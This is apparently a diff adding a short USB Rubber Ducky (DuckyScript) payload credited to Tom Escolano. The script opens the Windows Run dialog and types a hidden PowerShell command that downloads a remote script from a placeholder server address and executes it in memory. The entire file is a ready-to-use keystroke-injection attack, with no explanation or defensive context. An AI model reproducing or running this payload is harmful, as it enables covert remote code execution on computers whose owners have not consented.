@@ -1,0 +1,6 @@
+REM Author: Tom ESCOLANO - www.tomescolano.fr || www.foxty.io
+DELAY 2000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle hidden IEX (New-Object Net.WebClient).DownloadString('https://<adresse serveur>/r.ps1');
+ENTER
